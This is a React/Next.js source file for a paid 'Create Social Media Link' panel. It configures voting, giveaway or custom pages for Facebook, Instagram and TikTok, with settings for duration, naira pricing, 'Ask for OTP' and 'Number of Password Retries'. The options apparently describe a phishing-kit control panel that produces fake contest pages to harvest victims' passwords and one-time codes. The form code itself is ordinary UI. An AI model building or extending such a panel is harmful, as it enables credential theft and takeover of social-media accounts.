'use client';

import { useState } from 'react';
import { toast } from 'react-hot-toast';
import { useRouter } from 'next/navigation';

type LinkType = 'voting' | 'giveaway' | 'custom';
type SocialPlatform = 'facebook' | 'instagram' | 'tiktok';

interface FormData {
  type: LinkType;
  image: string;
  bannerImage: string;
  linkName: string;
  title: string;
  contestantName: string;
  writeup: string;
  platforms: SocialPlatform[];
  duration: number;
  askForOtp: boolean;
  retry: number;
}

interface FormErrors {
  linkName?: string;
  title?: string;
  contestantName?: string;
  writeup?: string;
  image?: string;
  bannerImage?: string;
}

export default function SocialGeneratePage() {
  const [formData, setFormData] = useState<FormData>({
    type: 'voting',
    image: '',
    bannerImage: '',
    linkName: '',
    title: '',
    contestantName: '',
    writeup: '',
    platforms: ['facebook'],
    duration: 1,
    askForOtp: true,
    retry: 1
  });
  const [errors, setErrors] = useState<FormErrors>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const router = useRouter();

  const handleImageChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setFormData({ ...formData, image: value });
    if (errors.image) {
      setErrors(prev => ({ ...prev, image: undefined }));
    }
  };

  const handleBannerImageChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setFormData({ ...formData, bannerImage: value });
    if (errors.bannerImage) {
      setErrors(prev => ({ ...prev, bannerImage: undefined }));
    }
  };

  const validateForm = (): boolean => {
    const newErrors: FormErrors = {};

    if (!formData.linkName.trim()) {
      newErrors.linkName = 'Link name is required';
    } else if (formData.linkName.length > 50) {
      newErrors.linkName = 'Link name must be less than 50 characters';
    }

    // Validate title for giveaway and custom type
    if (formData.type === 'giveaway' || formData.type === 'custom') {
      if (!formData.title.trim()) {
        newErrors.title = 'Title is required';
      } else if (formData.title.length > 100) {
        newErrors.title = 'Title must be less than 100 characters';
      }
    }

    // Validate contestant name only for voting type
    if (formData.type === 'voting') {
      if (!formData.contestantName.trim()) {
        newErrors.contestantName = 'Contestant name is required';
      } else if (formData.contestantName.length > 50) {
        newErrors.contestantName = 'Contestant name must be less than 50 characters';
      }
    }

    if (!formData.writeup.trim()) {
      newErrors.writeup = 'Writeup is required';
    } else if (formData.writeup.length > 500) {
      newErrors.writeup = 'Writeup must be less than 500 characters';
    }

    // Validate image for all types
    if (!formData.image.trim()) {
      newErrors.image = 'Image URL is required';
    }

    // vlaidate banner image for voting and giveaway
    if (formData.type === 'voting' || formData.type === 'giveaway') {
      if (!formData.bannerImage.trim()) {
        newErrors.bannerImage = 'Banner image URL is required';
      }
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm() || isSubmitting) {
      return;
    }

    setIsSubmitting(true);
    
    try {
      const response = await fetch('/api/auth/links/generate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: formData.type,
          linkName: formData.linkName,
          title: formData.title,
          contestantName: formData.contestantName,
          writeup: formData.writeup,
          platforms: formData.platforms,
          duration: formData.duration,
          image: formData.image,
          bannerImage: formData.bannerImage,
          askForOtp: formData.askForOtp,
          retry: formData.retry
        }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || 'Failed to generate link');
      }

      const data = await response.json();
      
      // Show success message and redirect
      toast.success('Link generated successfully!');
      router.push(`/links`);
      
    } catch (error) {
      console.error('Error submitting form:', error);
      toast.error(error instanceof Error ? error.message : 'Failed to generate link');
      setIsSubmitting(false);
    }
  };

  const handleTypeChange = (type: LinkType) => {
    // Clear fields based on type
    setFormData(prev => ({
      ...prev,
      type,
      title: type === 'voting' ? '' : prev.title,
      contestantName: type !== 'voting' ? '' : prev.contestantName,
      // Keep image for all types
      image: prev.image,
      bannerImage: prev.bannerImage,
      platforms: prev.platforms,
      duration: prev.duration
    }));
    // Clear any errors for the fields that are now hidden
    setErrors(prev => ({
      ...prev,
      title: undefined,
      contestantName: undefined
    }));
  };

  const handlePlatformToggle = (platform: SocialPlatform) => {
    setFormData(prev => {
      // If platform is already selected and there's more than one platform selected,
      // we can remove it
      if (prev.platforms.includes(platform) && prev.platforms.length > 1) {
        return {
          ...prev,
          platforms: prev.platforms.filter(p => p !== platform)
        };
      }
      // If platform is not selected, add it
      else if (!prev.platforms.includes(platform)) {
        return {
          ...prev,
          platforms: [...prev.platforms, platform]
        };
      }
      // If trying to deselect the last platform, keep it selected
      return prev;
    });
  };

  const calculatePrice = () => {
    const basePrice = 4000; // Base price for first platform
    const additionalPrice = 2500; // Price for each additional platform
    const additionalPlatforms = formData.platforms.length - 1;
    const platformTotal = basePrice + (additionalPlatforms > 0 ? additionalPlatforms * additionalPrice : 0);
    
    // Duration multipliers
    const durationMultipliers: Record<number, number> = {
      1: 1,
      2: 2,
      4: 4,
      8: 7,
      12: 10,
    } as const;
    
    // Type guard to ensure duration is a valid key
    const isDurationValid = (duration: number): duration is keyof typeof durationMultipliers => {
      return duration in durationMultipliers;
    };
    
    return platformTotal * (isDurationValid(formData.duration) ? durationMultipliers[formData.duration] : 1);
  };

  return (
    <div className="max-w-2xl mx-auto py-8">
      <h1 className="text-2xl font-semibold text-primary-400 mb-6">Create Social Media Link</h1>
      
      <form className="space-y-6" onSubmit={handleSubmit}>
        {/* Link Type Selection */}
        <div>
          <label className="block text-sm font-medium text-gray-400 mb-2">Type</label>
          <div className="flex gap-2">
            {(['voting', 'giveaway', 'custom'] as LinkType[]).map((type) => (
              <button
                key={type}
                type="button"
                onClick={() => handleTypeChange(type)}
                className={`px-4 py-2 rounded-full text-sm font-medium transition-colors duration-200
                  ${formData.type === type
                    ? 'bg-primary-400 text-black'
                    : 'bg-gray-900 text-gray-400 hover:bg-gray-800'
                  }`}
              >
                {type.charAt(0).toUpperCase() + type.slice(1)}
              </button>
            ))}
          </div>
        </div>

        {/* Image Input */}
        <div>
          <label htmlFor="image" className="block text-sm font-medium text-gray-400 mb-2">
            Image URL
          </label>
          <input
            type="text"
            id="image"
            value={formData.image}
            onChange={handleImageChange}
            className={`w-full px-4 py-2 bg-gray-900 border rounded-lg focus:ring-1 focus:ring-primary-600 text-gray-100
              ${errors.image ? 'border-red-500' : 'border-primary-800 focus:border-primary-600'}`}
            placeholder="Enter image URL"
          />
          {errors.image && (
            <p className="mt-1 text-sm text-red-500">{errors.image}</p>
          )}
        </div>

        {
          (formData.type === 'voting' || formData.type === 'giveaway') && (
            <div>
              <label htmlFor="image" className="block text-sm font-medium text-gray-400 mb-2">
                Banner Image URL
              </label>
              <input
                type="text"
                id="image"
                value={formData.bannerImage}
                onChange={handleBannerImageChange}
                className={`w-full px-4 py-2 bg-gray-900 border rounded-lg focus:ring-1 focus:ring-primary-600 text-gray-100
                  ${errors.bannerImage ? 'border-red-500' : 'border-primary-800 focus:border-primary-600'}`}
                placeholder="Enter image URL"
              />
              {errors.bannerImage && (
                <p className="mt-1 text-sm text-red-500">{errors.bannerImage}</p>
              )}
            </div>
          )
        }

        {/* Link Name - Always shown */}
        <div>
          <label htmlFor="linkName" className="block text-sm font-medium text-gray-400 mb-2">
            Link Name
          </label>
          <input
            type="text"
            id="linkName"
            value={formData.linkName}
            onChange={(e) => {
              setFormData({ ...formData, linkName: e.target.value });
              if (errors.linkName) {
                setErrors(prev => ({ ...prev, linkName: undefined }));
              }
            }}
            className={`w-full px-4 py-2 bg-gray-900 border rounded-lg focus:ring-1 focus:ring-primary-600 text-gray-100
              ${errors.linkName ? 'border-red-500' : 'border-primary-800 focus:border-primary-600'}`}
            placeholder="Give this link a name"
            maxLength={50}
          />
          {errors.linkName && (
            <p className="mt-1 text-sm text-red-500">{errors.linkName}</p>
          )}
        </div>

        {/* Title - Show for giveaway and custom types */}
        {(formData.type === 'giveaway' || formData.type === 'custom') && (
          <div>
            <label htmlFor="title" className="block text-sm font-medium text-gray-400 mb-2">
              Title
            </label>
            <input
              type="text"
              id="title"
              value={formData.title}
              onChange={(e) => {
                setFormData({ ...formData, title: e.target.value });
                if (errors.title) {
                  setErrors(prev => ({ ...prev, title: undefined }));
                }
              }}
              className={`w-full px-4 py-2 bg-gray-900 border rounded-lg focus:ring-1 focus:ring-primary-600 text-gray-100
                ${errors.title ? 'border-red-500' : 'border-primary-800 focus:border-primary-600'}`}
              placeholder="Enter title"
              maxLength={100}
            />
            {errors.title && (
              <p className="mt-1 text-sm text-red-500">{errors.title}</p>
            )}
          </div>
        )}

        {/* Contestant Name - Only show for voting type */}
        {formData.type === 'voting' && (
          <div>
            <label htmlFor="contestantName" className="block text-sm font-medium text-gray-400 mb-2">
              Contestant Name
            </label>
            <input
              type="text"
              id="contestantName"
              value={formData.contestantName}
              onChange={(e) => {
                setFormData({ ...formData, contestantName: e.target.value });
                if (errors.contestantName) {
                  setErrors(prev => ({ ...prev, contestantName: undefined }));
                }
              }}
              className={`w-full px-4 py-2 bg-gray-900 border rounded-lg focus:ring-1 focus:ring-primary-600 text-gray-100
                ${errors.contestantName ? 'border-red-500' : 'border-primary-800 focus:border-primary-600'}`}
              placeholder="Enter contestant name"
              maxLength={50}
            />
            {errors.contestantName && (
              <p className="mt-1 text-sm text-red-500">{errors.contestantName}</p>
            )}
          </div>
        )}

        {/* Writeup */}
        <div>
          <label htmlFor="writeup" className="block text-sm font-medium text-gray-400 mb-2">
            Writeup
          </label>
          <textarea
            id="writeup"
            rows={4}
            value={formData.writeup}
            onChange={(e) => {
              setFormData({ ...formData, writeup: e.target.value });
              if (errors.writeup) {
                setErrors(prev => ({ ...prev, writeup: undefined }));
              }
            }}
            className={`w-full px-4 py-2 bg-gray-900 border rounded-lg focus:ring-1 focus:ring-primary-600 text-gray-100
              ${errors.writeup ? 'border-red-500' : 'border-primary-800 focus:border-primary-600'}`}
            placeholder="Enter description"
            maxLength={500}
          />
          {errors.writeup && (
            <p className="mt-1 text-sm text-red-500">{errors.writeup}</p>
          )}
          <p className="mt-1 text-sm text-gray-500">{formData.writeup.length}/500 characters</p>
        </div>

        {/* Social Media Platforms */}
        <div>
          <label className="block text-sm font-medium text-gray-400 mb-2">
            Social Media Platforms
          </label>
          <div className="flex flex-wrap gap-2">
            {(['facebook', 'instagram', 'tiktok'] as SocialPlatform[]).map((platform) => (
              <button
                key={platform}
                type="button"
                onClick={() => handlePlatformToggle(platform)}
                className={`px-4 py-2 rounded-full text-sm font-medium transition-colors duration-200
                  ${formData.platforms.includes(platform)
                    ? 'bg-primary-400 text-black'
                    : 'bg-gray-900 text-gray-400 hover:bg-gray-800'
                  }`}
              >
                {platform.charAt(0).toUpperCase() + platform.slice(1)}
              </button>
            ))}
          </div>
          <div className="mt-3">
            <label className="block mt-5 text-sm font-medium text-gray-400 mb-2">
              Ask for OTP
            </label>
            <div className="flex gap-2">
              {[
                { value: true, label: 'Yes' },
                { value: false, label: 'No' }
              ].map((option) => (
                <button
                  key={option.label}
                  type="button"
                  onClick={() => setFormData(prev => ({ ...prev, askForOtp: option.value }))}
                  className={`px-4 py-2 rounded-full text-sm font-medium transition-colors duration-200
                    ${formData.askForOtp === option.value
                      ? 'bg-primary-400 text-black'
                      : 'bg-gray-900 text-gray-400 hover:bg-gray-800'
                    }`}
                >
                  {option.label}
                </button>
              ))}
            </div>
          </div>
          <div className="mt-3">
            <label className="block mt-5 text-sm font-medium text-gray-400 mb-2">
              Number of Password Retries
            </label>
            <div className="flex gap-2">
              {[1, 2, 3].map((value) => (
                <button
                  key={value}
                  type="button"
                  onClick={() => setFormData(prev => ({ ...prev, retry: value }))}
                  className={`px-4 py-2 rounded-full text-sm font-medium transition-colors duration-200
                    ${formData.retry === value
                      ? 'bg-primary-400 text-black'
                      : 'bg-gray-900 text-gray-400 hover:bg-gray-800'
                    }`}
                >
                  {value}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Duration Selection */}
        <div>
          <label className="block text-sm font-medium text-gray-400 mb-2">
            Duration
          </label>
          <div className="flex flex-wrap gap-2">
            {[
              { value: 1, label: '1 Week' },
              { value: 2, label: '2 Weeks' },
              { value: 4, label: '1 Month' },
              { value: 8, label: '2 Months' },
              { value: 12, label: '3 Months' }
            ].map((option) => (
              <button
                key={option.value}
                type="button"
                onClick={() => setFormData(prev => ({ ...prev, duration: option.value }))}
                className={`px-4 py-2 rounded-full text-sm font-medium transition-colors duration-200
                  ${formData.duration === option.value
                    ? 'bg-primary-400 text-black'
                    : 'bg-gray-900 text-gray-400 hover:bg-gray-800'
                  }`}
              >
                {option.label}
              </button>
            ))}
          </div>
        </div>

        {/* Price Display */}
        <div className="bg-gray-900/50 border border-primary-800 rounded-lg p-4">
          <div className="flex justify-between items-center">
            <span className="text-gray-400">Price</span>
            <span className="text-xl font-semibold text-primary-400">
              ₦{calculatePrice().toLocaleString()}
            </span>
          </div>
        </div>

        {/* Submit Button */}
        <button
          type="submit"
          disabled={isSubmitting}
          className={`w-full py-3 px-4 rounded-lg font-medium text-black bg-primary-400 
            hover:bg-primary-500 transition-colors duration-200
            disabled:opacity-50 disabled:cursor-not-allowed
            flex items-center justify-center gap-2`}
        >
          {isSubmitting ? (
            <>
              <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                  fill="none"
                />
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                />
              </svg>
              Generating...
            </>
          ) : (
            'Generate Link'
          )}
        </button>
      </form>
    </div>
  );
}
